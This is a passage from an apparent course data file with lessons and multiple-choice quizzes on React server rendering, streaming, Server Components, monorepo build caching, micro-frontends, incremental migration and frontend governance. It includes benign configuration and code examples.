\`useSyncExternalStore\` is the principled option for browser-only state, because its third argument is the snapshot the server uses:

\`\`\`jsx
const width = useSyncExternalStore(subscribeToResize, () => window.innerWidth, () => 1024);
\`\`\`

Server renders 1024, first client render returns 1024, hydration passes, then the store updates and React re-renders normally.

### The mistake to avoid

Filing a hydration warning as cosmetic because the page looks fine in your browser. A mismatch means React discarded the server HTML and re-rendered on the client, so you are paying for SSR and getting CSR timings. It will never show up as a crash. It shows up as one route with a mysteriously bad LCP in your field data, months later.
      `,
        [
          q('Why does rendering a div inside a p element reliably break hydration, even though the JSX looks fine?', [
            'React forbids block elements nested inside inline components',
            'The parser closes the paragraph early, so the div becomes a sibling',
            'className is serialised differently by the server renderer',
            'Divs cannot receive event listeners during the hydration pass',
          ], 1, 'The HTML parser cannot keep a div inside a paragraph, so it ends the paragraph and the div arrives as a sibling where React expected a child.'),
          q('What does React 18 actually do when it finds a hydration mismatch in a subtree?', [
            'It patches only the differing text node and keeps hydrating',
            'It throws, so the page keeps server markup with no listeners',
            'It retries hydration three times before showing a fallback UI',
            'It discards that subtree and client renders it, so you pay for SSR and get CSR',
          ], 3, 'React abandons the mismatched boundary and re-renders it in the browser, which throws away the server work while still charging you the server cost.'),
          q('A ThemeToggle read localStorage inside useState and produced a mismatch. Moving the read into useEffect fixes the warning, but dark mode users now see a white flash. What removes the flash?', [
            'A blocking script in head that stamps data-theme onto the html element',
            'Wrapping the toggle in suppressHydrationWarning at the root level',
            'Reading the theme in useLayoutEffect rather than inside useEffect',
            'Rendering the toggle only once the first paint has been committed',
          ], 0, 'The flash happens before React runs at all, so only markup applied before the body paints can fix it, which is what a small blocking script setting an attribute on the html element does.'),
        ]
      ),
      lesson('Streaming, Suspense, and Selective Hydration', 14, `
A course detail page needs four queries. Three return in under 60 ms. The reviews aggregation takes 900 ms. With \`renderToString\` the first byte leaves at 980 ms, because a synchronous render cannot emit half a document. With streaming, the header, title, syllabus and enrol button reach the browser at 90 ms and the reviews slot fills itself in when the query finally lands.

Same server, same queries, same total work. Ten times better perceived load.

### The shell is everything outside a Suspense boundary

\`renderToPipeableStream\` splits your render in two. React produces the **shell**, all the markup that does not depend on pending data, and flushes it immediately. Each \`<Suspense>\` boundary emits its fallback into that stream as a placeholder. When a boundary's data resolves, React writes the real HTML into a hidden \`<template>\` at the end of the body plus a tiny inline script that moves it into place.

\`\`\`jsx
// BAD: one boundary around the page, so TTFB waits for the slowest query
<Suspense fallback={<PageSkeleton />}>
  <Header /><CourseDetail /><Reviews /><Recommendations />
</Suspense>

// GOOD: fast content is the shell, each slow region gets its own boundary
<Header />
<CourseDetail />
<Suspense fallback={<ReviewsSkeleton />}><Reviews /></Suspense>
<Suspense fallback={<RecsSkeleton />}><Recommendations /></Suspense>
\`\`\`

The first version streams technically and helps nobody. Boundary placement is the entire optimisation.

### Wiring it to a response

\`\`\`js
let didError = false;
const { pipe, abort } = renderToPipeableStream(<App url={req.url} />, {
  bootstrapScripts: ['/assets/client.js'],
  onShellReady() {
    res.statusCode = didError ? 500 : 200;
    res.setHeader('Content-Type', 'text/html');
    pipe(res);
  },
  onShellError() {
    res.statusCode = 500;
    res.setHeader('Content-Type', 'text/html');
    res.send('<h1>Something went wrong</h1>');
  },
  onError(err) { didError = true; logger.error(err); },
});
setTimeout(abort, 10_000);
\`\`\`

Note what \`onShellReady\` implies: once you call \`pipe\`, the status line and headers are gone. A database failure inside \`<Reviews />\` at 900 ms **cannot** turn a 200 into a 500. React swaps that boundary's fallback for a client-side retry and your error boundary (Chapter 6) handles it in the browser. Decide your status code before the shell flushes, and never after.

Use \`onAllReady\` instead of \`onShellReady\` when the consumer needs a complete document: a crawler that does not run inline scripts, a PDF renderer, an email preview. You lose streaming and get correctness.

### Selective hydration is what makes it worth doing

Streamed HTML alone would be cruel: content the user can see but not click. React solves it by hydrating boundaries **independently**, in the order their HTML and code arrive, rather than in one blocking pass over the root.

Better still, it reprioritises on input. If someone clicks the enrol button while React is busy hydrating the reviews, React records that event, hydrates the button's boundary first, then replays the click. The interaction is not lost, only delayed by a few milliseconds.

### The three things that silently break it

| Symptom | Cause | Fix |
|---|---|---|
| Whole page arrives at once | A buffering proxy | \`proxy_buffering off\` or send \`X-Accel-Buffering: no\` |
| Nothing flushes early | Compression middleware buffering | Flush per chunk, or compress at the edge |
| Layout jumps as slots fill | Fallbacks sized differently to the content | Give skeletons the final height |

The proxy one costs teams weeks. Your local server streams perfectly, staging behind nginx does not, and the timings look identical to non-streaming SSR because that is exactly what they now are.

### The mistake to avoid

Wrapping a slow component in \`<Suspense>\` and assuming the work got faster. Nothing got faster. You chose what the user waits for. If the reviews query is 900 ms it is still 900 ms, and if it sits above the fold you have simply moved a spinner to a more prominent place. Stream the slow thing when it is genuinely secondary. Fix the query when it is not.
      `,
        [
          q('A page wraps its header, detail, reviews and recommendations in one Suspense boundary and streams the response. What does streaming buy here?', [
            'Each region hydrates separately as soon as its own markup arrives',
            'The header flushes first, then the detail, then the two slow lists',
            'Almost nothing, since the shell waits for the slowest child to resolve',
            'The status code can still be corrected after the reviews query fails',
          ], 2, 'Everything inside the single boundary is suspended together, so the shell contains only the fallback and the first useful byte still waits for the slowest query.'),
          q('Why can a database error inside a streamed Reviews boundary not produce a 500 response?', [
            'React turns every render error into a 200 with an empty body',
            'The status line and headers already went out with the shell',
            'Error boundaries are disabled once selective hydration begins',
            'onError runs on the client, long after the response has closed',
          ], 1, 'Calling pipe inside onShellReady commits the status line and headers, so any failure that happens later can only be handled in the browser.'),
          q('Streaming works on your laptop, but on staging every response arrives as a single chunk with the old timings. What is the most likely cause?', [
            'The Suspense fallbacks are taller than the content replacing them',
            'React aborted the stream when the ten second timeout fired',
            'bootstrapScripts was omitted, so hydration never actually starts',
            'A reverse proxy is buffering the whole response before forwarding',
          ], 3, 'A proxy with buffering enabled collects the entire response before sending it, which turns streaming back into ordinary blocking SSR without any error appearing anywhere.'),
        ]
      ),
      lesson('Server Components, Actions, and the Client Boundary', 14, `
Rendering a lesson body needs a markdown parser and a syntax highlighter: 180 KB gzipped between them, for output that never changes after the request. Ship that component as a **Server Component** and the browser downloads 0 KB of it. Not a smaller chunk. None of it.

That is the pitch, and it only makes sense once you know what a server component actually emits.

### It does not emit HTML

A server component renders to a serialised description of UI, streamed to the client as a payload React knows how to interpret. That payload contains rendered output for server parts and *references* to client components with their props. React merges it into the existing tree, which is why navigating between server-rendered routes does not blow away client state.

The consequences follow from one rule: server components run once, on the server, and never hydrate.

| Capability | Server Component | Client Component |
|---|---|---|
| \`useState\`, \`useEffect\` | No | Yes |
| \`onClick\` and other handlers | No | Yes |
| Query the database directly | Yes | No |
| Adds to the JS bundle | No | Yes |
| Re-renders after interaction | No | Yes |

### 'use client' is a boundary, not a label

The directive marks an entry point into the client graph. Every module a client module imports becomes client code, transitively. That is what catches people:

\`\`\`jsx
// BROKEN: Sidebar is now bundled and shipped, along with everything it imports
'use client';
import Sidebar from './Sidebar';

export function Tabs({ tab, setTab }) {
  return <div>{tab === 'outline' ? <Sidebar /> : <Notes />}</div>;
}
\`\`\`

The fix is composition, exactly as Chapter 1 argued. Pass server-rendered output *through* the client component as a prop:

\`\`\`jsx
// page.jsx, a server component
<Tabs outline={<Sidebar />} notes={<Notes />} />
\`\`\`

\`<Sidebar />\` is rendered on the server, arrives in the payload, and \`Tabs\` merely positions it. A client component can hold server-rendered children forever, as long as it receives them rather than imports them.

Whatever crosses the boundary must serialise. Strings, numbers, plain objects, arrays, Dates, Maps, Sets and promises all travel. Functions and class instances do not, so passing \`onSelect={handleSelect}\` down from a server parent throws at render time. The single exception is a Server Action.

### Actions turn a form into a mutation

\`\`\`js
'use server';
export async function enrol(prevState, formData) {
  const session = await getSession();
  if (!session) return { error: 'Sign in to enrol' };

  const courseId = String(formData.get('courseId'));
  if (!/^[a-z0-9-]{3,64}$/.test(courseId)) return { error: 'Unknown course' };

  await db.enrolments.create({ userId: session.userId, courseId });
  revalidatePath(\`/courses/\${courseId}\`);
  return { ok: true };
}
\`\`\`

\`\`\`jsx
'use client';
const [state, action, pending] = useActionState(enrol, {});
return (
  <form action={action}>
    <input type="hidden" name="courseId" value={course.id} />
    <button disabled={pending}>{pending ? 'Enrolling...' : 'Enrol'}</button>
    {state.error && <p role="alert">{state.error}</p>}
  </form>
);
\`\`\`

Because the browser submits a real \`<form>\`, this works before hydration finishes and even with JavaScript disabled. \`useFormStatus\` gives nested components the same pending flag without prop drilling.

Now the part that gets shipped wrong. **A server action compiles to a public POST endpoint with a guessable id.** Nothing about the \`'use server'\` directive authenticates anyone. If the only check on who may enrol lives in the button you conditionally rendered, an attacker who never loads your UI can call the action directly with any \`courseId\` they like. Every action authorises and validates its own arguments, every time, exactly like the API routes in Chapter 7.

### The mistake to avoid

Putting \`'use client'\` at the top of the root layout because something deep inside needed a hook. That one line drags the entire tree into the bundle and quietly deletes the benefit you adopted the model for. Push the directive down to the smallest interactive leaf: the toggle, the tab bar, the search input.
      `,
        [
          q('A client component imports Sidebar, which is a server component, and the bundle grows. What happened, and what fixes it?', [
            'Imports pull modules into the client graph, so pass Sidebar as a prop',
            'Server components are copied into every chunk, so use a dynamic import',
            'The bundler cannot tree shake JSX, so export Sidebar as a named function',
            'The directive applies per file, so declare \'use client\' in Sidebar too',
          ], 0, '\'use client\' marks a boundary in the module graph, so anything imported beneath it is bundled, and composition through props keeps Sidebar rendering on the server.'),
          q('Which prop, passed from a server component down into a client component, throws at render time?', [
            'A Date object holding the enrolment deadline',
            'A Map of lesson ids to completion percentages',
            'A callback function the client will run on select',
            'A promise that resolves to the review summary',
          ], 2, 'Props crossing the boundary must serialise, and a plain function cannot be sent to the client, which is why server actions exist as the one supported exception.'),
          q('Your enrol server action performs no authorisation because the button only renders for signed in users. What is the actual risk?', [
            'The action cannot serialise formData sent by anonymous visitors',
            'It is a public POST endpoint anyone can call with any arguments',
            'revalidatePath will purge cached pages for every course at once',
            'Progressive enhancement stops working when JavaScript is disabled',
          ], 1, 'The compiler turns the action into a reachable HTTP endpoint, so an attacker who never loads your interface can invoke it directly with whatever payload they choose.'),
        ]
      ),
      ],
      [
      q('A route server renders in 40 ms, but its recommendations query takes 700 ms and holds the first byte. What is the cheapest fix that keeps the main content crawlable?', [
        'Switch the whole route to client rendering and fetch after mount',
        'Call renderToString twice, once before and once after the fetch',
        'Mark the recommendations component with \'use client\' instead',
        'Wrap recommendations in Suspense and stream it after the shell',
      ], 3, 'A Suspense boundary moves the slow query out of the shell, so the crawlable content flushes at 40 ms and the recommendations arrive in the same response later.'),
      q('Which symptom tells you that server rendering has effectively been undone at runtime?', [
        'A hydration mismatch warning on a route that still looks correct',
        'A Suspense fallback showing briefly before the reviews arrive',
        'A server component that never appears inside any client chunk',
        'A form action that runs before the client bundle has hydrated',
      ], 0, 'A mismatch makes React throw away the server markup and re-render on the client, so you keep paying for SSR while your users get client rendering timings.'),
      q('Why does putting \'use client\' at the top of the root layout defeat the point of server components?', [
        'React refuses to stream any response below a client boundary',
        'Every module the tree imports joins the client bundle',
        'Server actions can no longer be invoked from a nested form',
        'Suspense boundaries stop flushing until all data has resolved',
      ], 1, 'The directive is transitive down the import graph, so declaring it at the root pulls the entire application into the bundle you were trying to shrink.'),
      q('Which statement about hydration during a streamed response is accurate?', [
        'React hydrates the whole root in one pass once every chunk lands',
        'Clicks made before hydration are dropped and have to be repeated',
        'Boundaries hydrate independently, and a click prioritises its own',
        'Hydration is skipped for any boundary that streamed out of order',
      ], 2, 'Selective hydration lets each Suspense boundary hydrate as its markup and code arrive, and an interaction reorders the queue so the clicked boundary is hydrated first and the event replayed.'),
      ]
    ),
    chapter(
      'Frontend Architecture at Scale',
      'Structuring a codebase that many teams commit to, migrating the parts you inherited rather than rewriting them, and governing the whole estate over years.',
      [
      lesson('Monorepos, Shared Packages, and Build Caching', 14, `
Fourteen packages, one README change, and CI runs for 41 minutes because it rebuilt every one of them. People stop waiting for the pipeline and start merging on hope. That is the monorepo failure teams actually hit, and the monorepo is not the cause. A build with no task graph and no cache is.

### The trade you are actually making

| Cost | Separate repos | One repo |
|---|---|---|
| Changing a shared Button | three PRs, an npm publish, version bumps | one PR, every consumer compiled against it |
| Finding every usage | grep the repos you remember | one grep |
| Upgrading React | staggered across teams, forever | one lockfile, one coordinated day |
| CI time | naturally scoped | needs a task graph to stay sane |
| Ownership | implied by the repo | needs a CODEOWNERS file |

A monorepo does not delete coordination work. It moves that work from release time to merge time, where it is visible and cheap. The React row is the sharp edge: one lockfile means one React version for everyone, so a package that needs a different major blocks the estate until somebody does the upgrade.

### Workspaces and internal packages

\`\`\`json
{
  "name": "acme",
  "private": true,
  "workspaces": ["apps/*", "packages/*"]
}
\`\`\`

That gives you \`apps/checkout\`, \`apps/admin\`, \`packages/ui\`, \`packages/api-client\`, \`packages/eslint-config\`. An app depends on a package by name at version \`*\`, and the package manager symlinks it instead of downloading anything.

Internal packages come in two shapes. A source package exports \`.tsx\` directly and is compiled by whichever app imports it: no build step, instant edits, at the cost of every consumer needing compatible compiler settings. A built package ships \`dist/\` behind an \`exports\` map: slower, but publishable outside the repo and safe for consumers with different tooling. Start with source packages. Convert one to built only when an external consumer appears.

The bug that eats an afternoon: \`packages/ui\` imports \`date-fns\` without listing it in its own \`package.json\`. Hoisting puts a copy in the root \`node_modules\`, so it resolves locally, passes CI, then breaks the day the app that actually declared it upgrades or drops it. Declare every import you make.

### The task graph is the whole trick

\`\`\`json
{
  "tasks": {
    "build": { "dependsOn": ["^build"], "outputs": ["dist/**"] },
    "test":  { "dependsOn": ["build"], "inputs": ["src/**", "package.json"] },
    "lint":  { "dependsOn": [] }
  }
}
\`\`\`

\`^build\` means build my dependencies first. With that declared, the runner builds \`packages/ui\` and \`packages/api-client\` in parallel, then the two apps, and it hashes the inputs of each task on the way. Same hash as a previous run and it replays the stored output in about 200ms rather than running anything.

Two rules keep the cache honest. Declare every input, or a task will hit cache after a change that mattered. Declare every output, or the replay restores nothing and the next task fails on a missing \`dist/\`. A cache that lies once teaches the whole team to pass \`--force\` forever, which is worse than having no cache.

Then scope the run to what changed:

\`\`\`bash
turbo run test lint --filter=...[origin/main]
\`\`\`

That expands to the packages the branch touched plus everything that depends on them. The README change now runs nothing. A change to \`packages/ui\` still runs both apps, correctly, because the graph says those apps consume it. Filtering to touched packages only, without the leading dots, is the mistake that ships a broken app with a green pipeline.

### Remote caching

Point the cache at shared storage and CI uploads artifacts your laptop can download. The first person to build a branch pays, everyone else replays, and so does every retried CI job. On a repo this size that turns a 12 minute pull request check into roughly 90 seconds, and the gap widens as the repo grows instead of closing.
      `,
        [
          q('A build task declares its outputs but leaves one of its inputs out of the config. What goes wrong?', [
            'The task reruns on every commit because its hash never matches',
            'The remote cache refuses to store any output for that task',
            'The task replays a cached result after a change that should have rebuilt it',
            'Dependent packages start building before their dependencies finish',
          ], 2, 'The cache key is a hash of the declared inputs, so an undeclared file can change without changing the key, and the runner serves a stale build as if it were current.'),
          q('packages/ui imports date-fns but never lists it in its own package.json, and everything passes locally and in CI. Why is that still a bug?', [
            'It resolves only because a sibling hoisted it, so it breaks when that changes',
            'Hoisted dependencies are always dropped from the production bundle',
            'Workspaces forbid a package from importing any transitive dependency',
            'date-fns exposes no default export, so the import is undefined at runtime',
          ], 0, 'The import works by accident through the hoisted root node_modules, and it stops working the day the package that actually declared date-fns upgrades or removes it.'),
          q('What does running tasks with --filter=...[origin/main] change about a CI run?', [
            'It caches the output of every package rather than only the changed ones',
            'It skips the build stage and tests against the previous artifact',
            'It runs tasks only for the packages whose files the branch edited',
            'It runs the changed packages plus everything that depends on them',
          ], 3, 'The leading dots widen the selection to dependents, which is what stops a change inside packages/ui shipping while an app that consumes it was never tested.'),
        ]
      ),
      lesson('Micro-Frontends and Module Federation', 14, `
Four teams, one bundle, one release train. A flaky test owned by the search team blocks a payments fix for six hours. Somebody says micro-frontends, and the room agrees before anyone asks what they cost.

Ask first. Micro-frontends solve an organisational problem: independent deployment for teams that cannot agree on a release cadence. They make nothing faster, smaller or simpler. If one team owns the app, this is a tax with no benefit.

### Three ways to compose, in increasing order of pain

| Style | Independent deploys | Cost |
|---|---|---|
| Build time packages | no, the host rebuilds | nothing beyond versioning |
| Route level, separate apps | yes | a full page load at the seam, duplicated vendor code |
| Runtime composition | yes | shared dependency policy, version skew, harder debugging |

Route level is badly underrated. Put \`/admin\` and \`/shop\` behind one reverse proxy, each its own deployment, and two teams ship independently after a week of work. Users pay a full page load crossing the boundary, which in an admin area nobody notices.

### Module Federation

Runtime composition earns its cost only when two teams' code must appear on the same screen. The remote publishes a manifest, the host loads it at runtime.

\`\`\`js
// apps/search/rspack.config.js   the remote
new ModuleFederationPlugin({
  name: 'search',
  filename: 'remoteEntry.js',
  exposes: { './ResultsPanel': './src/ResultsPanel' },
  shared: {
    react: { singleton: true, requiredVersion: '^18.2.0' },
    'react-dom': { singleton: true, requiredVersion: '^18.2.0' },
  },
});
\`\`\`

\`\`\`jsx
// apps/shell   the host
const ResultsPanel = lazy(() => import('search/ResultsPanel'));
\`\`\`

\`singleton: true\` is the line that decides whether any of this works. Without it the host and the remote each load their own React, and two copies of React means two independent hook dispatchers. You get \`Invalid hook call\`, or a context that quietly returns its default value because the provider lives in the other copy's tree. Chapter 3 covered why a context read misses its provider; here the reason is that there are two Reacts and the panel is reading from the wrong one.

### Version skew is the operational bug

Never cache \`remoteEntry.js\` hard. The manifest is a mutable pointer, so it must be revalidated on every load, while the chunks it names carry content hashes and can be cached for a year. Get that backwards and a shell keeps loading a manifest naming chunks that were deleted at the last deploy, which is the \`Failed to fetch dynamically imported module\` error from Chapter 6, except another team caused it and your dashboard is the one showing it.

Treat every exposed module as a public API. A remote that renames a prop on \`ResultsPanel\` breaks a host it cannot see and never tested against. In practice: keep the old prop working for one release, and run a contract test in the host pipeline against the remote's currently deployed manifest rather than against a local build of it.

### Isolate the failure

A remote that returns 404 must degrade one panel, not white-screen the shell.

\`\`\`jsx
<ErrorBoundary fallback={<p>Search is unavailable.</p>}>
  <Suspense fallback={<Skeleton />}>
    <ResultsPanel query={query} />
  </Suspense>
</ErrorBoundary>
\`\`\`

Boundaries catch what is thrown during render, and a rejected \`import()\` inside \`lazy\` surfaces there, so this one holds. Give every remote its own boundary and its own skeleton.

### What it actually costs

Two remotes on one page ship two versions of the design system unless you federate that too, and CSS from one bleeds into the other unless the styling architecture from Chapter 10 is enforced in both repos. A stack trace now stops at a team boundary. Someone has to own the shell: routing, auth, the shared dependency list, and the version policy that says which React the estate runs. That team is not optional. Without it the estate drifts inside two quarters, and you have paid for independent deployment while getting coupled releases anyway.
      `,
        [
          q('A federated remote renders correctly on its own, but inside the shell it throws Invalid hook call. What is the likely cause?', [
            'The remote exposes a component that renders inside Suspense',
            'React is not shared as a singleton, so two copies are loaded',
            'The host requested remoteEntry.js before its own entry chunk ran',
            'The remote was compiled by a different bundler than the host',
          ], 1, 'Two React instances mean two hook dispatchers, so a component rendered by one while its hooks resolve against the other fails on the first hook it calls.'),
          q('Which caching setup is correct for a Module Federation deployment?', [
            'Cache remoteEntry.js for a year and revalidate the hashed chunks',
            'Cache remoteEntry.js and the hashed chunks for a year each',
            'Disable caching on both so the shell always fetches current code',
            'Revalidate remoteEntry.js on every load and cache the hashed chunks',
          ], 3, 'The manifest is a mutable pointer and has to be re-fetched, while content hashed chunks never change under a given name and can safely be cached for a long time.'),
          q('When is route level composition behind a proxy the better choice than Module Federation?', [
            'When teams need independent deploys but never share a screen',
            'When two teams render widgets inside one shared page layout',
            'When each team wants to ship a different version of React',
            'When the shell must pass live client state into each fragment',
          ], 0, 'Route level splitting buys independent deployment for a fraction of the operational cost, and its one real drawback, a full page load at the seam, does not apply when the sections are separate pages.'),
        ]
      ),
      lesson('Incremental Migration, Codemods, and Legacy Code', 14, `
The rewrite was scoped at four months. At month eleven the new app renders three of nineteen screens, the old app has shipped forty features the new one has never heard of, and the team maintains two of everything. Nobody chose that. It is the default outcome of a rewrite running beside a product that keeps shipping.

The alternative has a name: strangler fig. Put the new implementation in front of the old one, move traffic across route by route, and delete old code as it empties out. Every week ends with something released.

### Own the URL first

The cheapest boundary is the router, and it lives above your app.

\`\`\`nginx
location /checkout { proxy_pass http://next-app; }
location /         { proxy_pass http://legacy-app; }
\`\`\`

\`/checkout\` is now React and TypeScript. Everything else is the 2016 app, untouched. Users cross the seam with one full page load, a real cost and a far smaller one than a feature freeze. Move \`/account\` next month, \`/search\` after that.

Inside a page you cannot split by route, mount React into nodes the old app renders:

\`\`\`jsx
import { createRoot } from 'react-dom/client';
import { PriceWidget } from '@acme/ui';

document.querySelectorAll('[data-react-price]').forEach((el) => {
  createRoot(el).render(<PriceWidget sku={el.dataset.sku} />);
});
\`\`\`

One rule stops this becoming a third system: data crosses the seam in one direction. The old page passes props in through data attributes, React never writes back into a legacy global. When both sides mutate the same object you get bugs that reproduce only in the exact order a real user clicked.

### Codemods do the boring 90 percent

Renaming a prop across 1,400 call sites by hand is not a quarter well spent, and \`sed\` cannot read JSX. Transform the syntax tree instead.

\`\`\`js
// codemods/button-variant.js
export default function transform(file, api) {
  const j = api.jscodeshift;
  return j(file.source)
    .findJSXElements('Button')
    .forEach((path) => {
      path.node.openingElement.attributes.forEach((attr) => {
        if (attr.type === 'JSXAttribute' && attr.name.name === 'type') {
          attr.name.name = 'variant';
        }
      });
    })
    .toSource({ quote: 'single' });
}
\`\`\`

\`\`\`bash
npx jscodeshift -t codemods/button-variant.js "packages/**/*.tsx"
\`\`\`

Commit the output as its own commit, with nothing hand written in it. A reviewer then reads the transform once, skims the diff for shape, and approves 1,400 files honestly. Mix three manual fixes into that commit and the whole thing becomes unreviewable, so it gets approved without being read.

A codemod cannot see \`<Button {...cellProps} />\`, a component re-exported under a different name, or a prop assembled from a variable. Expect it to cover most call sites, never all of them. Catch the tail with a lint rule that errors on the old name, so nobody reintroduces it while the migration is still running.

### Ratchet, do not hope

Migrations stall when progress is invisible. Count it, and let the count only fall.

\`\`\`bash
#!/usr/bin/env bash
count=$(grep -rl "from '@acme/legacy-ui'" apps packages | wc -l | tr -d ' ')
echo "legacy-ui imports: $count (ceiling 128)"
[ "$count" -le 128 ] || { echo "A new legacy-ui import was added"; exit 1; }
\`\`\`

Run it in the pipeline from Chapter 6, lower the ceiling in the same pull request that removes files, and post the number in the team channel every Friday. Two hundred and eleven down to zero across five months is a migration. "We are gradually moving off legacy-ui" is a sentence people say for years.

Then delete. Code with no callers is not free: it turns up in searches, gets copied by whoever joined last month, and generates dependency alerts somebody has to triage.
      `,
        [
          q('Why commit codemod output as its own commit, with no hand written changes mixed in?', [
            'Git cannot produce a usable diff for more than 500 changed files',
            'It allows the codemod to be re-run against that commit later',
            'A reviewer can check the transform once instead of reading 1,400 files',
            'Formatters only run on commits that contain a single kind of change',
          ], 2, 'The review moves from the diff to the transform, which is the only way a change that size gets genuinely read rather than rubber stamped.'),
          q('A jscodeshift transform renames the type prop on Button. Which call site will it miss?', [
            'Button imported from the design system and rendered directly',
            'Button rendered as <Button {...cellProps} /> with its props spread',
            'Button rendered inside a ternary in the middle of a file',
            'Button with the prop written on its own second line',
          ], 1, 'A spread hides the prop name from the syntax tree, so the transform has nothing to rename and the old key keeps flowing through at runtime.'),
          q('What does a CI ratchet on legacy imports give you that a migration plan does not?', [
            'It rewrites the remaining call sites automatically on a nightly job',
            'It removes the need for a lint rule on the deprecated package',
            'It proves the replacement package is smaller than the old one',
            'It blocks any pull request that adds a new usage of the old code',
          ], 3, 'A ceiling that can only fall stops the migration losing ground while it runs, which is how most gradual migrations quietly fail.'),
        ]
      ),
      lesson('Budgets, Standards, and Deprecation Paths', 13, `
Nobody ships a 400 kB regression. Twelve people ship 34 kB each over a quarter, every one defensible on its own, and the checkout bundle crosses a megabyte. Code review cannot catch that. Only a number that fails a build can.

### A budget is a build step, not a dashboard

\`\`\`json
[
  { "path": "apps/checkout/dist/assets/index-*.js",  "limit": "165 kB", "gzip": true },
  { "path": "apps/checkout/dist/assets/vendor-*.js", "limit": "120 kB", "gzip": true },
  { "path": "apps/admin/dist/assets/index-*.js",     "limit": "240 kB", "gzip": true }
]
\`\`\`

\`size-limit\` runs in the pipeline from Chapter 6 and exits non zero when a limit is passed. The admin app gets a looser budget deliberately: 40 staff on office wifi are not 200,000 customers on 4G, and a budget that ignores that difference is a budget engineers learn to ignore.

Set the first limit at roughly today's size plus 5 percent, not at the number you wish you had. A gate that is already red on the day it lands teaches everyone to bypass it in week one.

| Gate | Signal | Enforcement |
|---|---|---|
| Bundle size | gzipped bytes per entry | fail the build |
| INP and LCP | field data at the 75th percentile | alert, reviewed weekly |
| Accessibility | axe violations on key routes | fail the build |
| Types at the boundary | files still casting responses | ratchet, cannot increase |

Field data cannot gate a build, because it only exists after the deploy and moves with traffic. Lab numbers can, and should.

### Raising a budget is fine, quietly routing around it is not

Make the exception path real: raise the limit in a pull request, in the same commit as the code that needed it, with the owner and the reason in the message. Two lines of git history beat a policy everyone escapes with \`--no-verify\`.

### Standards enforced by tooling, not by review comments

\`\`\`js
// eslint.config.js
'no-restricted-imports': ['error', {
  paths: [
    { name: 'moment', message: 'Use date-fns. moment adds 68 kB gzipped.' },
    { name: 'lodash', message: 'Import the function directly: lodash/debounce.' },
  ],
  patterns: [
    { group: ['@acme/legacy-ui/*'], message: 'Deprecated, removed in v6. Codemod: codemods/legacy-ui.js' },
  ],
}],
\`\`\`

The message field is where the standard actually lives. An error that names the replacement and the reason gets followed. An error that says "restricted import" gets an eslint-disable comment written directly above it.

### A deprecation with no removal date is a second API forever

| Stage | Timing | What ships |
|---|---|---|
| Announce | week 0 | changelog entry, replacement available, migration note |
| Warn | weeks 1 to 8 | JSDoc \`@deprecated\`, one dev only console warning, lint rule at warn |
| Migrate | weeks 2 to 10 | codemod run by the owning team, ratchet on remaining usages |
| Remove | next major | deleted, with the codemod left in the repo |

Ship the replacement and the codemod before the warning, never after. A deprecation warning with no migration path is a message telling four teams to stop their own work and solve your problem, and they will not.

Measure adoption by counting imports, not by asking. \`grep -rl "@acme/legacy-ui" apps | wc -l\` returns a number you can chart every Friday, and it is the same ratchet the migration already runs.

### Governance that survives a reorganisation

Every shared package gets one owning team in CODEOWNERS and a named maintainer in its README. Cross cutting changes, a router upgrade, a new state library, a styling change, go through a short written proposal with a decision and a date, committed to the repo beside the code. The point is not ceremony. The point is that in eighteen months someone will ask why the estate does it this way, and the answer should be a file rather than a person who has since left.
      `,
        [
          q('Why set the first bundle budget at roughly current size plus 5 percent?', [
            'A limit already failing on day one trains people to bypass the gate',
            'Bundlers cannot measure gzipped size below the current total',
            'A limit under current size makes the build cache miss every run',
            'The margin covers the difference between gzip and brotli output',
          ], 0, 'A gate has to be green when it lands, otherwise its first signal is noise and the team learns to skip it rather than respond to it.'),
          q('Why can field INP data not gate a build the way bundle size does?', [
            'Field data is sampled, so it can never be attributed to a route',
            'INP is a lab only metric, so a CI runner has no access to it',
            'It only exists after the deploy and moves with real traffic',
            'Browsers report it too rarely to ever reach significance',
          ], 2, 'You cannot fail a build on a number that does not exist until real users have run the released code, so field metrics belong in alerting and weekly review instead.'),
          q('What makes a no-restricted-imports rule actually change what people write?', [
            'Setting it to error rather than warn in the shared config',
            'A message naming the replacement and the reason for the rule',
            'Applying it to every workspace package, test files included',
            'Pairing it with a pre-commit hook so it runs before CI does',
          ], 1, 'An engineer blocked mid task follows a rule that tells them what to use instead, and disables one that only says the import is restricted.'),
        ]
      ),
      ],
      [
      q('A pull request that only edits packages/api-client runs both apps full test suites and takes 40 minutes. What fixes it?', [
        'Split api-client back out into a repository of its own',
        'Cache node_modules between CI runs on the same branch',
        'Run the apps test suites nightly instead of per pull request',
        'Declare the task graph and run only affected packages with caching on',
      ], 3, 'A dependency graph plus content hashed caching lets CI run the packages a change can affect and replay the rest, which is what keeps a monorepo pipeline short as it grows.'),
      q('Two federated remotes on one page each ship their own design system copy and their styles collide. What is the shared cause?', [
        'The remotes were compiled by two different bundler versions',
        'The design system is not shared as a singleton, and its CSS is global',
        'The host loads both remotes before its own entry chunk runs',
        'Suspense boundaries around each remote fail to isolate their styles',
      ], 1, 'Anything not declared as shared is duplicated per remote, and unscoped CSS from one remote applies to the whole document, so both symptoms come from the same missing policy.'),
      q('A team is eleven months into a rewrite that renders three of nineteen screens while the old app keeps shipping. What should change?', [
        'Route traffic per URL so each migrated screen ships as it is finished',
        'Freeze features on the old app until the rewrite has caught up',
        'Copy the remaining old screens into the new app unchanged',
        'Restart the rewrite in a fresh repo with a smaller framework',
      ], 0, 'A strangler boundary in front of both apps means value ships every week and the old code shrinks, instead of two systems diverging while nothing reaches users.'),
      q('Which deprecation actually gets adopted by the teams it affects?', [
        'A console warning shipped in the release that deletes the old API',
        'A changelog note asking teams to migrate before the next quarter',
        'A replacement and a codemod shipped before the warning, with a removal date',
        'A lint rule set to error on the day the deprecation is announced',
      ], 2, 'Teams move when the migration path is shorter than the workaround, so the replacement, the automated rewrite and a known removal date all have to exist before anyone is asked to move.'),
      ]
    ),
  ],
  final: [
    q('Why does {count && <Badge />} render a 0 when count is 0?', [
      'React converts falsy values to strings',
      'The && expression returns 0, and React renders numbers as text',
      'Badge receives count as a child',
      'JSX cannot short-circuit',
    ], 1, 'React skips false, null and undefined but renders 0, so the falsy number leaks into the output.'),
    q('An edit form keeps showing the previous record after the selection changes, because state was initialised from props. The cleanest fix is to', [
      'change the component key so React remounts it with new initial state',
      'add an effect that resets the state',
      'convert the inputs to uncontrolled',
      'wrap the component in React.memo',
    ], 0, 'A new key creates a new instance, resetting state without the stale first render a reset effect produces.'),
    q('setTotal is called inside an effect that watches items. What is the better design?', [
      'Store the total in a ref',
      'Move both values into context',
